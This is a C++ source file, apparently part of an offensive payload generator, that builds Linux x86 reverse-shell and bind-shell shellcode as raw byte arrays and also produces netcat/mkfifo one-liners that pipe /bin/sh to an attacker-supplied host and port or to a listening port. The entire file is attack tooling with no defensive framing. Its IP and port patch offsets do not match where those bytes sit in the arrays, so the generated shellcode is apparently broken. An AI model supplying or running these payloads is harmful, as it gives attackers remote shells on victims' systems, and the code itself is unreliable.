#include <arpa/inet.h>
#include <sstream>
#include "payload.hpp"

/// @brief Generates Linux x86 reverse shell payload
/// @param lhost is the attacker's IP address
/// @param lport is the attacker's port number
/// @return Raw Linux x86 reverse shell payload
std::vector<uint8_t> LinuxX86ReverseShell::generatePayload(const std::string& lhost, int lport) {
    std::vector<uint8_t> payload = {
        0x31, 0xc0, 0x50, 0x40, 0x89, 0xc3, 0x50, 0x40,
        0x89, 0xc1, 0x50, 0x89, 0xe1, 0xb0, 0x66, 0xcd,
        0x80, 0x89, 0xc2, 0x31, 0xc0, 0x68, 0x7f, 0x01, 
        0x01, 0x01, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 
        0x02, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 
        0xe1, 0xb0, 0x66, 0xcd, 0x80, 0x31, 0xc9, 0xb1, 
        0x03, 0x89, 0xd3, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 
        0x79, 0xf9, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 
        0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 
        0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80
    };

    // Patch IP (offset 20)
    uint32_t ip = inet_addr(lhost.c_str());
    payload[20] = ip & 0xFF;
    payload[21] = (ip >> 8) & 0xFF;
    payload[22] = (ip >> 16) & 0xFF;
    payload[23] = (ip >> 24) & 0xFF;

    // Patch port (offset 25)
    payload[25] = (lport >> 8) & 0xFF;
    payload[26] = lport & 0xFF;

    return payload;
}

/// @brief Generates Linux x86 reverse shell command
/// @param lhost is the attacker's IP address
/// @param lport is the attacker's port number
/// @return Linux x86 reverse shell command as a string
std::string LinuxX86ReverseShell::generateCommand(const std::string& lhost, int lport) {
    std::ostringstream cmd;
    cmd << "rm -f /tmp/f; mkfifo /tmp/f; "
        << "cat /tmp/f | /bin/sh -i 2>&1 | nc " << lhost << " " << lport << " > /tmp/f";
    return cmd.str();
}

/// @brief Generates Linux x86 bind shell payload
/// @param lport is the target port number
/// @return Raw Linux x86 bind shell payload
std::vector<uint8_t> LinuxX86BindShell::generatePayload(int lport) {
    std::vector<uint8_t> payload = {
        0x31, 0xdb, 0xf7, 0xe3, 0x53, 0x43, 0x53, 0x6a,
        0x02, 0x89, 0xe1, 0xb0, 0x66, 0xcd, 0x80, 0x5b,
        0x5e, 0x52, 0x68, 0x00, 0x00, 0x00, 0x00, 0x66, 
        0x6a, 0x02, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x50, 
        0x89, 0xe1, 0xb0, 0x66, 0xcd, 0x80, 0x89, 0x41, 
        0x04, 0xb3, 0x04, 0xb0, 0x66, 0xcd, 0x80, 0x43,
        0xb0, 0x66, 0xcd, 0x80, 0x93, 0x59, 0x6a, 0x3f, 
        0x58, 0xcd, 0x80, 0x49, 0x79, 0xf8, 0x68, 0x2f, 
        0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e,
        0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x99, 0xb0, 
        0x0b, 0xcd, 0x80
    };

    // Patch port (offset 20)
    payload[20] = (lport >> 8) & 0xFF;
    payload[21] = lport & 0xFF;

    return payload;
}

/// @brief Generates Linux x86 bind shell command
/// @param lport is the target port number
/// @return Linux x86 bind shell command as a string
std::string LinuxX86BindShell::generateCommand(int lport) {
    std::ostringstream cmd;
    cmd << "rm -f /tmp/f; mkfifo /tmp/f; "
        << "cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p " << lport << " > /tmp/f";
    return cmd.str();
}

